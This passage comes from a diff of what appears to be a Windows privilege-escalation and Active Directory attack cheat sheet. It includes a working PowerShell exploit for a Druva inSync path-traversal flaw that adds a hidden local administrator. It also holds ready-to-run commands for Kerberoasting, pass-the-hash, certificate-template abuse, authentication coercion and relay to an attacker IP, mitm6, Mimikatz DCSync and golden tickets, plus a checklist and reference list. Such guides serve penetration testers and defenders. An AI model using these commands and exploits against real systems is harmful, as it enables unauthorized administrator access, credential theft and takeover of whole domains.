+`C:\ProgramData\Druva\inSync4\`, but path traversal bypasses it.
+
+```powershell
 $ErrorActionPreference = "Stop"
-
 $cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
-
 $s = New-Object System.Net.Sockets.Socket(
     [System.Net.Sockets.AddressFamily]::InterNetwork,
     [System.Net.Sockets.SocketType]::Stream,
-    [System.Net.Sockets.ProtocolType]::Tcp
-)
+    [System.Net.Sockets.ProtocolType]::Tcp)
 $s.Connect("127.0.0.1", 6064)
+$header   = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType  = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command  = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
+$length   = [System.BitConverter]::GetBytes($command.Length)
+$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
+# Then log in as pwnd / SimplePass123
+```
 
-$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
-$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
-$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
-$length = [System.BitConverter]::GetBytes($command.Length);
+---
 
-$s.Send($header)
-$s.Send($rpcType)
-$s.Send($length)
-$s.Send($command)
-When prompted for credentials, use the pwnd account.
-``````
+## 11. Active Directory pivot
 
-•	PayloadsAllTheThings - Windows Privilege Escalation
-•	Priv2Admin - Abusing Windows Privileges
-•	RogueWinRM Exploit
-•	Potatoes
-•	Decoder's Blog
-•	Token Kidnapping
-•	Hacktricks - Windows Local Privilege Escalation
+### Kerberoasting
+
+```
+# Impacket (from Linux)
+impacket-GetUserSPNs <domain>/<user>:<pass> -request -outputfile tgs.txt
+hashcat -m 13100 tgs.txt rockyou.txt
+# Rubeus (from Windows) - use /ldaps and /opsec for stealth
+Rubeus.exe kerberoast /rc4opsec /ldaps /outfile:hashes.txt
+```
+
+### AS-REP roasting
+
+```
+impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat -no-pass
+impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat
+hashcat -m 18200 asrep.txt rockyou.txt
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+# Rubeus preauthscan for accounts not requiring pre-auth:
+Rubeus.exe preauthscan /users:users.txt /domain:corp.local
+```
+
+### Pass the hash / pass the key / overpass the hash
+
+```
+impacket-psexec    -hashes <hash> administrator@<ip>
+impacket-wmiexec   -hashes <hash> administrator@<ip>
+impacket-smbexec  -hashes <hash> administrator@<ip>
+impacket-atexec   -hashes <hash> administrator@<ip> "cmd"
+impacket-secretsdump -hashes <hash> administrator@<ip>
+:: Overpass the hash (PTK) with Rubeus
+Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt /opsec
+:: Diamond ticket - forge TGT from a legit TGT without krbtgt key
+Rubeus.exe diamond /user:user /password:pass /krbkey:KEY /ticketuser:administrator /groups:512
+```
+
+### BloodHound CE (Community Edition)
+
+BloodHound Legacy (v4) is deprecated/archived. CE (v6) is the future: Go
+REST API backend, PostgreSQL app DB, Neo4j graph DB, React frontend. In
+2025, OpenGraph integration extends beyond AD/Azure to diverse identity
+platforms (Okta, GitHub, AWS IAM) via a connector library.
+
+```
+# Remote collection, no shell needed (CE branch)
+bloodhound-ce-python -u <user> -p '<pass>' -d domain.local -dc-ip 10.10.10.10 -c all
+# SharpHound from a shell (v2.X, SpecterOps)
+SharpHound.exe -c All --zipfilename out.zip
+SharpHound.exe -c DCOnly --stealth
+SharpHound.exe -c Session,LoggedOn --loop --loopduration 02:00:00
+SharpHound.exe -c Container,Group,ACL,ObjectProps --searchforest
+```
+
+### ADCS (Active Directory Certificate Services) abuse
+
+Certipy (v5.0.3) now supports ESC1-ESC17 as of 2026.
+
+```
+# Enumerate vulnerable templates
+certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.10 -vulnerable
+Certify.exe find /vulnerable
+Certify.exe cas
+
+# ESC1 - enrollee supplies subject, Client Auth EKU, low-priv enrol
+certipy req -u user@domain.local -p 'Password123' -dc-ip 10.10.10.10 \
+  -target CA.domain.local -ca 'domain-CA' -template 'VulnTemplate' \
+  -upn administrator@domain.local
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
+
+# ESC15 (CVE-2024-49019) - Arbitrary Application Policy Injection ("EKUwu")
+# Affects unpatched CAs (pre-Nov 2024). Schema V1 templates with
+# CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT. Inject arbitrary Application Policies.
+certipy req -u user -p pass -ca 'CA' -template 'VulnV1' -application-policies <OIDs>
+
+# ESC16 - Security Extension Disabled on CA
+# CA globally configured to NOT include szOID_NTDS_CA_SECURITY_EXT SID
+# extension. Behaves as if ALL templates are ESC9. Exploitable when
+# StrongCertificateBindingEnforcement=0/1 (compatibility mode, default
+# until Feb 2025; full enforcement Sept 2025).
+# Combined with ESC6, works even under full enforcement (mode 2).
+
+# ESC8 - NTLM relay to HTTP enrollment endpoint
+ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+python3 PetitPotam.py <attacker-ip> <dc-ip>        # coerce auth
+certipy auth -pfx dc.pfx -dc-ip 10.10.10.10
+
+# Shadow Credentials (write msDS-KeyCredentialLink)
+certipy shadow auto -u user@domain.local -p 'Password123' -account 'target$'
+```
+
+Microsoft strong certificate mapping enforcement timeline:
+`StrongCertificateBindingEnforcement=2` (full) became default for new
+domains Feb 2025, existing domains Sept 2025.
+
+### Kerberos relay (KrbRelayUp)
+
+```
+# Local privesc via Kerberos relay when LDAP signing not enforced
+KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
+  -ComputerName PC$ -ComputerPassword Pass123
+KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
+  -ComputerName PC$ -ComputerPassword Pass123 -Method ADCS -CAEndpoint CA.domain.local
+```
+
+### Coerced authentication (force a SYSTEM/DC to authenticate to you)
+
+Coercer (https://github.com/p0dalirius/Coercer) bundles 12+ RPC methods:
+
+```
+coercer coerce -t target -u user -p pass -d domain -l attacker_ip
+coercer scan -t target --filter-protocol-name MS-EFSR
+coercer fuzz --targets-file hosts.txt -l attacker_ip
+```
+
+Individual tools:
+
+```
+# PetitPotam (MS-EFSR) - coerce DC to relay to ADCS
+python3 PetitPotam.py <attacker-ip> <dc-ip>
+# PrinterBug (MS-RPRN) - coerce print server auth
+python3 printerbug.py domain/user:pass@<target> <attacker-ip>
+# DFSCoerce (MS-DFSNM)
+python3 dfscoerce.py -u user -p pass <attacker-ip> <target>
+# ShadowCoerce (MS-FSRVP)
+python3 shadowcoerce.py -d domain -u user -p password LISTENER TARGET
+# CheeseOunce (MS-EVEN) - newer, now in Coercer
+```
+
+### IPv6 DNS takeover (mitm6)
+
+```
+sudo mitm6 -d domain.local
+# In another terminal, relay to LDAPS
+sudo ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh fakewpad.domain.local -l loot
+# Kerberos relay variant:
+sudo mitm6 -d domain.local --relay dc01.domain.local
+```
+
+mitm6 wins because Windows prefers IPv6 and trusts DHCPv6 advertisements.
+The victim's WPAD lookup goes to your relay. RA guard does not equal DHCPv6
+guard.
+
+### Mimikatz post-Domain-Admin
+
+```
+mimikatz # lsadump::dcsync /user:krbtgt
+mimikatz # lsadump::dcsync /domain:domain.local /all
+mimikatz # sekurlsa::logonpasswords
+mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
+          /sid:<SID> /krbtgt:<hash> /id:500 /ptt
+mimikatz # kerberos::golden /domain:domain.local /sid:<SID> \
+          /target:<host> /service:cifs /rc4:<hash> /user:Administrator /ptt
+```
+
+---
+
+## 12. Quick win checklist
+
+- [ ] Run `winPEASx64.exe` and `PrivescCheck` (with LOLDrivers), read red lines.
+- [ ] `whoami /priv` -> SeImpersonate? Potato family (section 7).
+- [ ] `whoami /priv` -> SeBackup/SeRestore/SeDebug/SeTakeOwnership/SeLoadDriver.
+- [ ] `Invoke-AllChecks` (PowerUp) for services, paths, AlwaysInstallElevated.
+- [ ] `schtasks /query /fo LIST /v` for writable SYSTEM tasks.
+- [ ] Unquoted service paths with writable parent dirs.
+- [ ] Credential loot: unattended, PS history, cmdkey, IIS, PuTTY, DPAPI.
+- [ ] `wmic product` -> exploit-db each version.
+- [ ] Server 2025 DC? BadSuccessor (CVE-2025-53779) dMSA abuse.
+- [ ] Domain joined: BloodHound CE, Kerberoast, AS-REP, ADCS ESC1-ESC17, relay.
+- [ ] Missing KBs -> Windows CVEs (CVE-2025-26633, CVE-2025-54918, CVE-2026-33825, etc).
+- [ ] Nightmare-Eclipse tooling: BlueHammer (CVE-2026-33825), RedSun, UnDefend,
+      YellowKey, GreenPlasma, MiniPlasma, LegacyHive. Check Defender platform
+      version >= 4.18.26050.3011. Look for `FunnyApp.exe`, `RedSun.exe`,
+      `undef.exe`, `z.exe` in user-writable dirs.
+- [ ] BYOVD: check LOLDrivers against blocklist and HVCI status.
+
+---
+
+## 13. References
+
+- PayloadsAllTheThings Windows Privesc: <https://github.com/swisskyrepo/PayloadsAllTheThings>
+- Priv2Admin: <https://github.com/gtworek/Priv2Admin>
+- HackTricks Windows Local Privesc: <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation>
+- The Potato Garden: <https://github.com/0xSebin/The-Potato-Garden>
+- RoguePotato/PrintSpoofer: <https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/>
+- GodPotato: <https://github.com/BeichenDream/GodPotato>
+- SigmaPotato: <https://github.com/tylerdotrar/SigmaPotato>
+- PrintNotifyPotato: <https://github.com/BeichenDream/PrintNotifyPotato>
+- EfsPotato: <https://github.com/zcgonvh/EfsPotato>
+- DCOMPotato: <https://github.com/zcgonvh/DCOMPotato>
+- FullPowers: <https://github.com/itm4n/FullPowers>
+- NTLM-Relay-to-SYSTEM: <https://github.com/Yareshms/NTLM-Relay-to-SYSTEM>
+- WinPEAS: <https://github.com/carlospolop/PEASS-ng>
+- PrivescCheck: <https://github.com/itm4n/PrivescCheck>
+- PowerUp / PowerSploit: <https://github.com/PowerShellMafia/PowerSploit>
+- Seatbelt / SharpUp: <https://github.com/GhostPack>
+- LOLDrivers: <https://www.loldrivers.io>
+- BloodHound CE: <https://github.com/SpecterOps/BloodHound>
+- SharpHound: <https://github.com/SpecterOps/SharpHound>
+- BloodHound.py: <https://github.com/dirkjanm/BloodHound.py>
+- Certipy: <https://github.com/ly4k/Certipy>
+- Certify: <https://github.com/GhostPack/Certify>
+- Rubeus: <https://github.com/GhostPack/Rubeus>
+- Coercer: <https://github.com/p0dalirius/Coercer>
+- PetitPotam: <https://github.com/ly4k/PetitPotam>
+- mitm6: <https://github.com/dirkjanm/mitm6>
+- BadSuccessor: <https://github.com/akamai/BadSuccessor>
+- BadSuccessor automation: <https://github.com/R8Sec/BadSuccessor>
+- AD BadSuccessor Audit: <https://github.com/sxyrxyy/AD-BadSuccessor-Audit>
+- CVE-2025-26633 PoC: <https://github.com/mbanyamer/MSC-EvilTwin-Local-Privilege-Escalation>
+- CVE-2025-62215 PoC: <https://github.com/abrewer251/CVE-2025-62215_Windows_Kernel_PE>
+- awesome_windows_logical_bugs: <https://github.com/sailay1996/awesome_windows_logical_bugs>
+- LOLBAS: <https://lolbas-project.github.io/>
+- WADComs: <https://wadcoms.github.io/>
+- Decoder blog (Token Kidnapping): <https://decoder.cloud/>
+- Awesome Advanced Windows Exploitation: <https://github.com/yeyintminthuhtut/Awesome-Advanced-Windows-Exploitation-References>
+- Barracuda threat research on Nightmare-Eclipse: <https://blog.barracuda.com/2026/05/19/nightmare-eclipse-zero-days-grudge>
+- Huntress intrusion report: <https://www.huntress.com/blog/nightmare-eclipse-intrusion>
+- SecurityOnline LegacyHive: <https://securityonline.info/legacyhive-windows-exploit/>
+- CyberSecurityNews LegacyHive: <https://cybersecuritynews.com/legacyhive-windows-0-day-vulnerability/>
+- DeepWiki BlueHammer analysis: <https://deepwiki.com/Nightmare-Eclipse/BlueHammer>
+- AlienVault OTX pulse: <https://otx.alienvault.com/pulse/69e68c661e82c96759b91265>
+- Microsoft CVE-2026-33825 advisory: <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825>
